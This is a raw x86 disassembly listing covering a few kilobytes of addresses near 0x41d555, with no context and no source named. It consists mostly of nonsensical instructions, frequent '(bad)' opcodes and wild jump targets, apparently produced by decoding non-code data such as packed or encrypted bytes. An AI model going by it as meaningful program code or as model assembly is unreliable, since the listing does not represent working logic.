  41d555:	rcl    BYTE PTR [ebx+0x6c588f29],1
  41d55b:	sub    edi,DWORD PTR [ebp-0x75]
  41d55e:	sub    ecx,esp
  41d560:	sub    DWORD PTR [ebx+0x7c],eax
  41d563:	mov    esp,0x580f83d1
  41d568:	or     bh,dl
  41d56a:	test   ecx,0x52c5bc63
  41d570:	idiv   DWORD PTR [ecx]
  41d572:	push   eax
  41d573:	stos   DWORD PTR es:[edi],eax
  41d574:	jge    0x41d513
  41d576:	add    dh,BYTE PTR [ebx]
  41d578:	ficomp WORD PTR [ebx-0x2db67cce]
  41d57e:	out    dx,eax
  41d57f:	add    DWORD PTR [edx+0xb],ecx
  41d582:	xchg   esi,eax
  41d583:	cmp    BYTE PTR [ebp+0x1d991676],bl
  41d589:	push   cs
  41d58a:	mov    dh,0x37
  41d58c:	loope  0x41d572
  41d58e:	mov    DWORD PTR [eax],esi
  41d590:	xchg   ebp,eax
  41d591:	(bad)  
  41d592:	add    dh,BYTE PTR [ecx]
  41d594:	inc    edi
  41d595:	outs   dx,DWORD PTR ds:[esi]
  41d596:	mov    ah,0x7d
  41d598:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41d59a:	dec    eax
  41d59b:	xor    eax,DWORD PTR [eax-0x7c]
  41d59e:	std    
  41d59f:	mov    ds:0xfa507cf9,eax
  41d5a4:	and    DWORD PTR [eax-0x4682aaff],ecx
  41d5aa:	imul   esp,ebx,0x6e301556
  41d5b0:	ins    DWORD PTR es:[edi],dx
  41d5b1:	push   cs
  41d5b2:	push   ds
  41d5b3:	and    al,0xb4
  41d5b5:	mov    ecx,0x7fcefabd
  41d5ba:	pop    edx
  41d5bb:	jge    0x41d605
  41d5bd:	push   ebp
  41d5be:	or     ch,BYTE PTR [ebp-0x74ced84f]
  41d5c4:	jg     0x41d57b
  41d5c6:	jecxz  0x41d598
  41d5c8:	or     ebp,esp
  41d5ca:	mov    cl,0xa1
  41d5cc:	ins    DWORD PTR es:[edi],dx
  41d5cd:	jle    0x41d553
  41d5cf:	mov    ebp,0xca98538b
  41d5d4:	daa    
  41d5d5:	neg    BYTE PTR [edi]
  41d5d7:	dec    ebx
  41d5d8:	into   
  41d5d9:	push   0x843cf1ec
  41d5de:	shr    DWORD PTR [eax-0x18],0x3a
  41d5e2:	push   edi
  41d5e3:	das    
  41d5e4:	cmp    ch,BYTE PTR [edx-0x21]
  41d5e7:	scas   eax,DWORD PTR es:[edi]
  41d5e8:	(bad)
  41d5eb:	(bad)  
  41d5ec:	mov    esi,0xa5ec01a2
  41d5f1:	lock or eax,0x853908be
  41d5f7:	loop   0x41d61c
  41d5f9:	mov    ds:0x5f8d9876,al
  41d5fe:	or     al,0xa
  41d600:	les    edi,FWORD PTR [esi+0xfb0c967]
  41d606:	xchg   edi,eax
  41d607:	(bad)  
  41d608:	mov    esi,0x3d73a852
  41d60d:	mov    edx,0x4a6d
	...
  41d672:	add    BYTE PTR [eax],al
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xd266e435
  41d681:	fld    TBYTE PTR [ebp+eax*4+0x70]
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR [ecx+eax*1],al
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	xchg   ebp,eax
  41d68d:	and    BYTE PTR [esi-0x3c],bh
  41d690:	sub    ch,al
  41d692:	inc    ecx
  41d693:	xchg   ebp,eax
  41d694:	push   ss
  41d695:	xchg   BYTE PTR [esp+ebp*4-0x78e2aef0],ah
  41d69c:	test   BYTE PTR [ebx],bl
  41d69e:	mov    ah,0xd6
  41d6a0:	jge    0x41d660
  41d6a2:	pop    eax
  41d6a3:	or     DWORD PTR [ebp+0x59e51aa7],0x9d726062
  41d6ad:	xor    al,0x29
  41d6af:	shr    ch,1
  41d6b1:	xor    ah,BYTE PTR es:[esi+0x7a]
  41d6b5:	add    ecx,DWORD PTR [ebp+0x4dda524]
  41d6bb:	jbe    0x41d6e0
  41d6bd:	mov    bl,0x9
  41d6bf:	addr16 sti 
  41d6c1:	push   cs
  41d6c2:	xor    ax,0x1f99
  41d6c6:	jbe    0x41d673
  41d6c8:	push   ss
  41d6c9:	(bad)  
  41d6ca:	ja     0x41d733
  41d6cc:	inc    eax
  41d6cd:	or     BYTE PTR [edx-0xe0a0190],dl
  41d6d3:	xchg   edx,eax
  41d6d4:	cmp    al,0x8c
  41d6d6:	mov    bl,0xbf
  41d6d8:	sar    DWORD PTR [edx-0x31ff3c5],0xe1
  41d6df:	jecxz  0x41d756
  41d6e1:	stc    
  41d6e2:	lods   al,BYTE PTR ds:[esi]
  41d6e3:	mov    ch,0x94
  41d6e5:	push   ds
  41d6e6:	mov    ebx,0x8743156f
  41d6eb:	mov    ebx,0x7ba6ba08
  41d6f0:	fs jge 0x41d6f8
  41d6f3:	or     DWORD PTR [edx-0x16d4535a],eax
  41d6f9:	mov    eax,ds:0xf7f66a07
  41d6fe:	xor    esi,esi
  41d700:	cmc    
  41d701:	mov    al,ds:0x91184629
  41d706:	push   ebx
  41d707:	out    0x3a,al
  41d709:	not    DWORD PTR [eax+0x1c6af96b]
  41d70f:	sahf   
  41d710:	add    esp,DWORD PTR [esi+0x521895bb]
  41d716:	aam    0x84
  41d718:	add    ah,BYTE PTR [edx+0x2]
  41d71b:	stos   BYTE PTR es:[edi],al
  41d71c:	pusha  
  41d71d:	add    bh,BYTE PTR [ecx]
  41d71f:	ror    ecx,0x40
  41d722:	cdq    
  41d723:	sbb    ebp,edi
  41d725:	sahf   
  41d726:	xchg   ebp,eax
  41d727:	js     0x41d724
  41d729:	rcr    DWORD PTR [edx],1
  41d72b:	js     0x41d6f4
  41d72d:	pop    ebp
  41d72e:	mov    DWORD PTR fs:[edx],eax
  41d731:	bound  ecx,QWORD PTR [edi]
  41d733:	or     ebp,esi
  41d735:	jge    0x41d70c
  41d737:	ret    
  41d738:	mov    bh,0x96
  41d73a:	es test eax,0xf785214d
  41d740:	lds    ebp,FWORD PTR [edi]
  41d742:	(bad)  
  41d743:	mov    esp,0x1ff7dee3
  41d748:	in     eax,dx
  41d749:	jbe    0x41d756
  41d74b:	inc    esi
  41d74c:	sbb    DWORD PTR [edi-0x67478039],eax
  41d752:	pop    esi
  41d753:	jmp    0x4373ed28
  41d758:	ret    0x7610
  41d75b:	bound  esi,QWORD PTR [ecx+ecx*2-0x555bf970]
  41d762:	jle    0x41d7b3
  41d764:	or     ebx,DWORD PTR [edx]
  41d766:	adc    ecx,DWORD PTR [edx]
  41d768:	inc    eax
  41d769:	mov    esi,0x3b824023
  41d76e:	jno    0x41d6f3
  41d770:	cmp    DWORD PTR [esi-0x31373eb3],0x9
  41d777:	sub    BYTE PTR [esi-0x6038ed0e],ah
  41d77d:	sbb    eax,0xc19bdbd8
  41d782:	mov    dl,0xb9
  41d784:	sub    ebp,DWORD PTR [ebx+ebp*4-0x2b7fcbf7]
  41d78b:	mov    al,ds:0xa19cc371
	...
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	push   edi
  41d801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d802:	jle    0x41d7ca
  41d804:	je     0x41d83f
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	and    al,BYTE PTR [esi+0x60]
  41d80f:	and    DWORD PTR [edx*4+0x5de68a1f],eax
  41d816:	push   es
  41d817:	inc    ebx
  41d818:	mov    edi,0xf6a75edd
  41d81d:	sbb    al,0xa3
  41d81f:	xor    ah,BYTE PTR [bp-0x52bb]
  41d824:	push   edx
  41d825:	lods   eax,DWORD PTR ds:[esi]
  41d826:	jne    0x41d7b4
  41d828:	pop    ds
  41d829:	push   ecx
  41d82a:	sbb    DWORD PTR [edi],0xffffff9f
  41d82d:	push   ds
  41d82e:	jl     0x41d871
  41d830:	push   eax
  41d831:	mov    ebp,0x53765f91
  41d836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d837:	ror    BYTE PTR [eax],1
  41d839:	push   es
  41d83a:	repz imul esi,DWORD PTR [ebx],0x5f
  41d83e:	push   ebx
  41d83f:	add    eax,0x23981c23
  41d844:	cld    
  41d845:	pop    ebp
  41d846:	xor    esi,DWORD PTR [ecx-0x60]
  41d849:	sub    BYTE PTR [ebx+ebx*2+0x24988ef3],bl
  41d850:	scas   eax,DWORD PTR es:[edi]
  41d851:	ja     0x41d868
  41d853:	mov    ah,0x1f
  41d855:	adc    BYTE PTR [ebp-0x3b],0xc3
  41d859:	add    esi,DWORD PTR [ecx-0x4f]
  41d85c:	or     esp,DWORD PTR [ebp+0x34]
  41d85f:	mov    DWORD PTR [edi+edi*1+0x6c],ecx
  41d863:	ins    BYTE PTR es:[edi],dx
  41d864:	xchg   edi,eax
  41d865:	popf   
  41d866:	cld    
  41d867:	mov    eax,ds:0xad0c4944
  41d86c:	inc    ecx
  41d86d:	pushf  
  41d86e:	dec    edi
  41d86f:	test   eax,0x6f646c76
  41d874:	je     0x41d807
  41d876:	(bad)  
  41d877:	dec    eax
  41d878:	cld    
  41d879:	push   ds
  41d87a:	shl    dl,0x91
  41d87d:	and    bl,ch
  41d87f:	jno    0x41d8ac
  41d881:	sahf   
  41d882:	or     eax,0x3cb4291f
  41d887:	mov    DWORD PTR [edx+edi*1-0x4f9f77b2],ebp
  41d88e:	fidiv  WORD PTR [ecx+0xf]
  41d891:	lods   eax,DWORD PTR ds:[esi]
  41d892:	daa    
  41d893:	fisttp QWORD PTR [ebx+0x2d5cb72c]
  41d899:	and    BYTE PTR [ebp-0x19],0xaa
  41d89d:	jno    0x41d88d
  41d89f:	pop    esp
  41d8a0:	xabort 0xcf
  41d8a3:	or     dh,dl
  41d8a5:	sbb    eax,0x17bad1a
  41d8aa:	test   eax,0x706e485
  41d8af:	push   0xc435c04c
  41d8b4:	ins    DWORD PTR es:[edi],dx
  41d8b5:	pop    ds
  41d8b6:	je     0x41d8d3
  41d8b8:	xlat   BYTE PTR ds:[ebx]
  41d8b9:	loope  0x41d8c7
  41d8bb:	les    ebp,FWORD PTR [edx-0x1a]
  41d8be:	sbb    BYTE PTR [ebx+0x42],al
  41d8c1:	mov    bh,0x87
  41d8c3:	jl     0x41d8b1
  41d8c5:	jo     0x41d8ef
  41d8c7:	fmul   st,st(1)
  41d8c9:	fs cmp eax,0x934ec0b1
  41d8cf:	(bad)  
  41d8d0:	fpatan 
  41d8d2:	pextrw ecx,(bad),0xc5
  41d8d4:	mov    cs,WORD PTR [eax]
  41d8d6:	fidivr DWORD PTR ds:0xb73a8724
  41d8dc:	shr    ebx,cl
  41d8de:	xchg   BYTE PTR [ecx+0x17],ch
  41d8e1:	add    edx,DWORD PTR [ebp-0x2cfd555]
  41d8e7:	inc    edx
  41d8e8:	xchg   ebp,eax
  41d8e9:	loopne 0x41d910
  41d8eb:	int    0x70
  41d8ed:	sahf   
  41d8ee:	dec    edi
  41d8ef:	sub    al,0x16
  41d8f1:	stos   BYTE PTR es:[edi],al
  41d8f2:	add    ebx,ebx
  41d8f4:	jecxz  0x41d8fc
  41d8f6:	xchg   esi,eax
  41d8f7:	xor    BYTE PTR [eax],0x82
  41d8fa:	xchg   BYTE PTR ds:0x879ee1b9,bh
  41d900:	add    edx,edi
  41d902:	(bad)  
  41d903:	in     al,dx
  41d904:	cwde   
  41d905:	cmp    bl,BYTE PTR [ebp-0x40a84795]
  41d90b:	mov    esp,0x168d74d5
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs push ds
  41d981:	xchg   ebp,eax
  41d982:	push   ebx
  41d983:	inc    esp
  41d984:	js     0x41d9c0
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    al,0x1
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	jns    0x41d978
  41d98e:	int    0xe4
  41d990:	enter  0xd1f9,0xc8
  41d994:	ins    BYTE PTR es:[edi],dx
  41d995:	jmp    0x41d970
  41d997:	pop    es
  41d998:	pop    ebx
  41d999:	das    
  41d99a:	mov    edx,0x8f220709
  41d99f:	outs   dx,DWORD PTR ds:[esi]
  41d9a0:	push   esp
  41d9a1:	in     eax,0x98
  41d9a3:	(bad)  
  41d9a4:	out    0xd4,al
  41d9a6:	or     ecx,DWORD PTR [edx+eax*4]
  41d9a9:	adc    dh,BYTE PTR [eax+0x4408a46d]
  41d9af:	shl    BYTE PTR [ebp-0x7e],1
  41d9b2:	mov    eax,0x39ebf0ae
  41d9b7:	adc    eax,0x7c156975
  41d9bc:	dec    ebp
  41d9bd:	fstp   DWORD PTR [ebx]
  41d9bf:	clc    
  41d9c0:	test   dh,ch
  41d9c2:	iret   
  41d9c3:	sbb    al,0xb1
  41d9c5:	pop    edi
  41d9c6:	js     0x41d977
  41d9c8:	loope  0x41d9f2
  41d9ca:	inc    edx
  41d9cb:	mov    ecx,0xd26d498d
  41d9d0:	pop    edx
  41d9d1:	cld    
  41d9d2:	popa   
  41d9d3:	cs mov eax,0x1f3dce86
  41d9d9:	jae    0x41d9ff
  41d9db:	out    dx,al
  41d9dc:	mov    cl,0xf8
  41d9de:	loope  0x41da22
  41d9e0:	ja     0x41d99e
  41d9e2:	sbb    ah,BYTE PTR [ecx-0x40f19ffa]
  41d9e8:	or     eax,0x8bdd7abf
  41d9ed:	pushf  
  41d9ee:	xchg   BYTE PTR [ebx-0x2651feb4],ch
  41d9f4:	enter  0x891c,0x6a
  41d9f8:	icebp  
  41d9f9:	jl     0x41d982
  41d9fb:	rol    esi,0xfd
  41d9fe:	popf   
  41d9ff:	mov    bl,0x8
  41da01:	jge    0x41d9b4
  41da03:	mov    ss,WORD PTR [edi-0x55]
  41da06:	sub    ah,ch
  41da08:	mov    bl,0xba
  41da0a:	pop    esi
  41da0b:	jbe    0x41da1a
  41da0d:	dec    eax
  41da0e:	fisub  DWORD PTR [ebp+0x26236557]
  41da14:	pop    edi
  41da15:	mov    esp,0x17966bbe
  41da1a:	xor    BYTE PTR [edi+0x68553eca],0xe7
  41da21:	retf   
  41da22:	int3   
  41da23:	sbb    eax,0x94396272
  41da28:	mov    esi,0xb2194d15
  41da2d:	out    0xd2,al
  41da2f:	inc    ebx
  41da30:	repz adc esp,eax
  41da33:	xor    al,0xa3
  41da36:	sahf   
  41da37:	out    dx,al
  41da38:	pop    edi
  41da39:	iret   
  41da3a:	push   cs
  41da3b:	(bad)  
  41da3c:	daa    
  41da3d:	(bad)  
  41da3e:	int    0x1f
  41da40:	cmp    al,0x70
  41da42:	or     eax,0x498a7270
  41da47:	ret    0xd46d
  41da4a:	jmp    0xde92884e
  41da4f:	popa   
  41da50:	xchg   esi,eax
  41da51:	dec    edi
  41da52:	mov    bh,0xb6
  41da54:	test   DWORD PTR [edx-0x2e534a65],esp
  41da5a:	pop    edi
  41da5b:	loop   0x41da56
  41da5d:	cwde   
  41da5e:	inc    esp
  41da5f:	cdq    
  41da60:	cmp    eax,0x52ce1994
  41da65:	push   cs
  41da66:	dec    ebx
  41da67:	cdq    
  41da68:	or     ecx,edx
  41da6a:	loopne 0x41da9f
  41da6c:	ret    0x10f2
  41da6f:	enter  0x8dc1,0xaf
  41da73:	fidiv  DWORD PTR [ebx+0x47]
  41da76:	xor    al,BYTE PTR [esi-0x13a731a5]
  41da7c:	adc    al,0x4e
  41da7e:	mov    cl,0xc
  41da80:	int    0x92
  41da82:	(bad)  
  41da84:	inc    esp
  41da85:	mov    ?,esp
  41da87:	lds    edx,FWORD PTR [ebp-0x61d2fa25]
  41da8d:	cli    
  41da8e:	leave  
  41da8f:	push   cs
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x6a
  41db01:	scas   eax,DWORD PTR es:[edi]
  41db02:	ins    DWORD PTR es:[edi],dx
  41db03:	idiv   BYTE PTR [ebx+edi*1+0x1]
  41db07:	add    BYTE PTR [ecx+eax*1],al
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	adc    eax,0xab2a2e46
  41db11:	cmp    ebp,0x1
  41db14:	pusha  
  41db15:	inc    edi
  41db16:	sub    DWORD PTR [ebx-0x5f62ba56],eax
  41db1c:	sti    
  41db1d:	sbb    DWORD PTR [edx+0x531bc1ad],ebx
  41db23:	rcl    BYTE PTR [ebp+eax*8+0x7],0x8b
  41db28:	xor    BYTE PTR [ecx],dh
  41db2a:	mov    ebx,0x61b84d03
  41db2f:	jmp    0xa34c:0x5551acfb
  41db36:	mov    eax,ds:0xcb0b8b83
  41db3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db3c:	xor    eax,0xd59f71d0
  41db41:	push   esi
  41db42:	and    eax,0xeabb4d7b
  41db47:	adc    BYTE PTR [eax-0x711f7a8e],bh
  41db4d:	das    
  41db4e:	or     DWORD PTR [esi],eax
  41db50:	mov    edx,0x734722b6
  41db55:	sub    BYTE PTR [eax-0x3b5d5dac],0x14
  41db5c:	shr    BYTE PTR [eax-0x24],1
  41db5f:	rol    al,0x47
  41db62:	mov    bl,0x5f
  41db64:	adc    eax,0xe7830b24
  41db69:	jno    0x41db6d
  41db6b:	push   ebp
  41db6c:	inc    esi
  41db6d:	or     esi,DWORD PTR [eax+0x18acf469]
  41db73:	scas   eax,DWORD PTR es:[edi]
  41db74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db75:	inc    edx
  41db76:	es nop
  41db78:	retf   0xc4d8
  41db7b:	inc    eax
  41db7c:	loop   0x41db65
  41db7e:	add    al,0xa6
  41db80:	mov    edi,0x6c2cda62
  41db85:	jns    0x41db43
  41db87:	ret    
  41db88:	fwait
  41db89:	cmp    al,0xa7
  41db8b:	nop
  41db8c:	push   edi
  41db8d:	xchg   esi,eax
  41db8e:	or     al,0x2c
  41db90:	test   BYTE PTR [edx-0x68520219],ch
  41db96:	mov    ch,0x2f
  41db98:	dec    esi
  41db99:	pop    edx
  41db9a:	xor    DWORD PTR [ebx-0x60],edx
  41db9d:	dec    ecx
  41db9e:	push   ss
  41db9f:	cmp    BYTE PTR [esi-0x1b92dd48],dh
  41dba5:	call   0x623c:0xd9670ce4
  41dbac:	arpl   WORD PTR [ebp+0x7],dx
  41dbaf:	mov    ebp,0x5e9ad3b4
  41dbb4:	je     0x41db64
  41dbb6:	cmp    DWORD PTR [esi+0x5cbc6e32],eax
  41dbbc:	sbb    al,0xd4
  41dbbe:	lods   eax,DWORD PTR ds:[esi]
  41dbbf:	sbb    al,0x6
  41dbc1:	ds cdq 
  41dbc3:	mov    al,0xa6
  41dbc5:	cs aas 
  41dbc7:	cmp    eax,0xe01bc458
  41dbcc:	dec    edx
  41dbcd:	imul   edi,DWORD PTR [ecx-0x75],0x20
  41dbd1:	dec    edx
  41dbd2:	and    bh,bl
  41dbd4:	js     0x41dbb6
  41dbd6:	adc    BYTE PTR [eax-0x61],dl
  41dbd9:	adc    ecx,DWORD PTR [esp+ebp*8+0x52]
  41dbdd:	hlt    
  41dbde:	ja     0x41dbe8
  41dbe0:	popf   
  41dbe1:	sahf   
  41dbe2:	dec    esp
  41dbe3:	fnsave [eax]
  41dbe5:	loope  0x41dc03
  41dbe7:	int    0x6e
  41dbe9:	jl     0x41dbcd
  41dbeb:	mov    edx,0xe8c45dcf
  41dbf0:	iret   
  41dbf1:	cld    
  41dbf2:	outs   dx,DWORD PTR ds:[esi]
  41dbf3:	xchg   ch,dl
  41dbf5:	add    al,0x14
  41dbf7:	xchg   ah,ah
  41dbf9:	mov    edi,0x6ca5659d
  41dbfe:	adc    BYTE PTR [eax],0x67
  41dc01:	repnz adc eax,0xf7218805
  41dc07:	mov    eax,0xb9b3813f
  41dc0c:	loope  0x41dc7d
  41dc0e:	and    ebx,DWORD PTR [ebx+0x0]
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x7b0d050]
  41dc81:	xchg   BYTE PTR [ecx],dl
  41dc83:	mov    cl,0x80
  41dc85:	cmp    al,0x1
  41dc87:	add    BYTE PTR [ecx+eax*1],al
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	push   0x6f
  41dc8e:	mov    es,WORD PTR [ebx+ecx*8]
  41dc91:	xor    al,0x75
  41dc93:	hlt    
  41dc94:	lods   eax,DWORD PTR ds:[esi]
  41dc95:	push   0xd63ec073
  41dc9a:	add    al,0x80
  41dc9c:	mov    es,WORD PTR ds:[esi]
  41dc9f:	stc    
  41dca0:	xor    al,0x34
  41dca2:	add    ebx,DWORD PTR cs:[esi-0xe]
  41dca6:	or     bl,ch
  41dca8:	icebp  
  41dca9:	pop    ebp
  41dcaa:	lahf   
  41dcab:	or     eax,0x2cfb24db
  41dcb0:	popf   
  41dcb1:	xor    al,0x28
  41dcb3:	push   edx
  41dcb4:	(bad)  
  41dcb5:	dec    esp
  41dcb6:	scas   al,BYTE PTR es:[edi]
  41dcb7:	mov    esi,0xd7afe3eb
  41dcbc:	and    al,BYTE PTR [eax]
  41dcbe:	and    esi,edx
  41dcc0:	ret    0x7770
  41dcc3:	and    eax,0xa7a1cb82
  41dcc8:	xchg   BYTE PTR [edx+0x20],cl
  41dccb:	and    DWORD PTR [ecx-0x4a],ebp
  41dcce:	je     0x41dc9f
  41dcd0:	sub    eax,0x81fba5
  41dcd5:	xor    eax,0x40e1e035
  41dcda:	rol    BYTE PTR [edi-0x35],1
  41dcdd:	cmp    edx,DWORD PTR [ebx]
  41dcdf:	dec    eax
  41dce0:	cmp    al,0xb8
  41dce2:	or     BYTE PTR [ebx+0x49],dl
  41dce5:	test   ebx,ebp
  41dce7:	ins    BYTE PTR es:[edi],dx
  41dce8:	jmp    0x65b452cf
  41dced:	add    al,0x97
  41dcef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcf0:	adc    eax,0x541587b2
  41dcf5:	int    0xd5
  41dcf7:	add    ch,BYTE PTR [ebp+0x3e]
  41dcfa:	imul   ecx,DWORD PTR [ebx-0x536da899],0x4b0b2663
  41dd04:	adc    ebx,edx
  41dd06:	gs jmp 0x2dd74d46
  41dd0c:	popf   
  41dd0d:	js     0x41dd4b
  41dd0f:	jle    0x41dd1e
  41dd11:	(bad)  
  41dd12:	retf   
  41dd13:	lds    edi,FWORD PTR [eax-0x68481625]
  41dd19:	repz mov al,0xa5
  41dd1c:	mov    dh,0xf9
  41dd1e:	outs   dx,DWORD PTR ds:[esi]
  41dd1f:	pushf  
  41dd20:	je     0x41dcf8
  41dd22:	lods   al,BYTE PTR ds:[esi]
  41dd23:	jbe    0x41dcec
  41dd25:	div    ah
  41dd27:	xor    BYTE PTR [ecx+0x5],bl
  41dd2a:	sub    eax,0x8e0009cb
  41dd2f:	push   es
  41dd30:	dec    ebx
  41dd31:	jmp    0x9ff2c846
  41dd36:	popa   
  41dd37:	jmp    0x324b:0x848cd32
  41dd3e:	ret    
  41dd3f:	jmp    0x41dd16
  41dd41:	pop    ds
  41dd42:	ret    
  41dd43:	push   ds
  41dd44:	pushf  
  41dd45:	enter  0x1901,0xe7
  41dd49:	popa   
  41dd4a:	sub    esi,ecx
  41dd4c:	cmp    al,0x80
  41dd4e:	rcr    DWORD PTR ds:0xaa8adea0,0x44
  41dd55:	pop    eax
  41dd56:	inc    edx
  41dd57:	adc    BYTE PTR [ebx+0x24],al
  41dd5a:	loop   0x41dd6f
  41dd5c:	js     0x41dd81
  41dd5e:	sti    
  41dd5f:	test   DWORD PTR [ecx-0x4bf004f3],edi
  41dd65:	leave  
  41dd66:	push   ebp
  41dd67:	xor    BYTE PTR [ebx+0x75871af],0x86
  41dd6e:	ret    
  41dd6f:	enter  0x617f,0x93
  41dd73:	nop
  41dd74:	jecxz  0x41dd86
  41dd76:	addr16 int 0x8f
  41dd79:	and    BYTE PTR [esi+0x75],0x5b
  41dd7d:	or     al,0x72
  41dd7f:	mov    DWORD PTR [eax],edi
  41dd81:	test   dl,bl
  41dd83:	icebp  
  41dd84:	fisttp WORD PTR [eax]
  41dd86:	test   eax,0x8f3f2ba2
  41dd8b:	pushf  
  41dd8c:	xchg   ebx,eax
  41dd8d:	push   esi
  41dd8e:	outs   dx,DWORD PTR ds:[esi]
  41dd8f:	mov    ebx,0x0
	...
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	xchg   ebp,eax
  41de01:	sub    cl,dl
  41de03:	xchg   esp,eax
  41de04:	test   BYTE PTR ds:0x1040001,bh
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	imul   ecx,DWORD PTR [edx-0xab19c19],0xffffffe6
  41de13:	cmp    eax,DWORD PTR [edx+0x40]
  41de16:	repz add ebp,DWORD PTR [ebx]
  41de19:	push   cs
  41de1a:	fisttp WORD PTR [ebx]
  41de1c:	in     eax,0x71
  41de1e:	add    DWORD PTR [edi],ebp
  41de20:	es sti 
  41de22:	fld    DWORD PTR [ecx-0x4518ba16]
  41de28:	xchg   esi,eax
  41de29:	fstp   QWORD PTR [edx-0x4e7114ec]
  41de2f:	sbb    ch,BYTE PTR [ebx-0x76]
  41de32:	retf   
  41de33:	inc    ebp
  41de34:	push   ecx
  41de35:	ret    
  41de36:	xor    ecx,DWORD PTR [ecx]
  41de38:	ret    
  41de39:	adc    DWORD PTR [ecx],ebx
  41de3b:	inc    si
  41de3d:	lods   eax,DWORD PTR ds:[esi]
  41de3e:	push   DWORD PTR [edi+edx*8]
  41de41:	stos   BYTE PTR es:[edi],al
  41de42:	add    ch,BYTE PTR [edx-0x10b26c58]
  41de48:	push   cs
  41de49:	outs   dx,BYTE PTR ds:[esi]
  41de4a:	or     edi,DWORD PTR [ebx-0x3d18f97c]
  41de50:	lods   al,BYTE PTR ds:[esi]
  41de51:	sbb    al,0x5
  41de53:	xchg   edx,eax
  41de54:	sub    al,0xa2
  41de56:	jmp    0x41deba
  41de58:	jg     0x41decc
  41de5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de5b:	xchg   ecx,eax
  41de5c:	pop    edx
  41de5d:	fst    st(4)
  41de5f:	hlt    
  41de60:	mov    WORD PTR [edi],fs
  41de62:	sti    
  41de63:	test   al,ah
  41de65:	and    BYTE PTR ds:0x2603f74b,0xae
  41de6c:	and    eax,0xdb905d0a
  41de71:	outs   dx,DWORD PTR ds:[esi]
  41de72:	xchg   edi,eax
  41de73:	scas   eax,DWORD PTR es:[edi]
  41de74:	mov    ch,0x25
  41de76:	push   esi
  41de77:	push   0x8c20ed32
  41de7c:	call   0xc607774f
  41de81:	pop    ebp
  41de82:	adc    DWORD PTR [esp+edx*8],edx
  41de85:	fidivr WORD PTR fs:[ebx-0x714f32a6]
  41de8c:	test   DWORD PTR [ebx+0x72],ebx
  41de8f:	dec    ebp
  41de90:	jmp    0x41df07
  41de92:	stos   DWORD PTR es:[edi],eax
  41de93:	out    0x6d,al
  41de95:	lods   eax,DWORD PTR ds:[esi]
  41de96:	cmp    DWORD PTR [ebx-0x156d142c],eax
  41de9c:	arpl   WORD PTR [esi-0xd],bp
  41de9f:	popf   
  41dea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dea1:	hlt    
  41dea2:	aas    
  41dea3:	rol    BYTE PTR ds:[di+0x7cc4],0x95
  41deaa:	inc    ebp
  41deab:	cs sbb al,0xcc
  41deae:	xchg   ebp,eax
  41deaf:	cmp    eax,0xdd532ed0
  41deb4:	test   eax,0xff1bfe0
  41deb9:	mov    ch,0xc
  41debb:	xor    BYTE PTR [edx-0x60],0x74
  41debf:	or     al,0x27
  41dec1:	retf   
  41dec2:	shrd   DWORD PTR [ecx+0x54ac2a7e],eax,0xc5
  41deca:	pusha  
  41decb:	je     0x41df2c
  41decd:	sub    esi,DWORD PTR [edi-0x895a4c8]
  41ded3:	scas   eax,DWORD PTR es:[edi]
  41ded4:	mov    esp,0x666f5bcf
  41ded9:	cli    
  41deda:	test   al,0xc
  41dedc:	cmp    eax,0x9e36a0e1
  41dee1:	push   eax
  41dee2:	and    eax,0xeacb1625
  41dee7:	push   0x55c10178
  41deec:	ret    0xf912
  41deef:	bound  edi,QWORD PTR [esi-0x4a]
  41def2:	jno    0x41df5d
  41def4:	cdq    
  41def5:	cs fs push 0x59
  41def9:	lea    ebx,[ecx+0x36]
  41defc:	aad    0x6f
  41defe:	pushf  
  41deff:	mov    WORD PTR [edx+0x5f86c78f],fs
  41df05:	adc    BYTE PTR [ebx+ebp*4-0x4755a92e],bh
  41df0c:	or     BYTE PTR [edx+ebp*1-0x24],bl
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x7c6a9ce9
  41df82:	scas   al,BYTE PTR es:[edi]
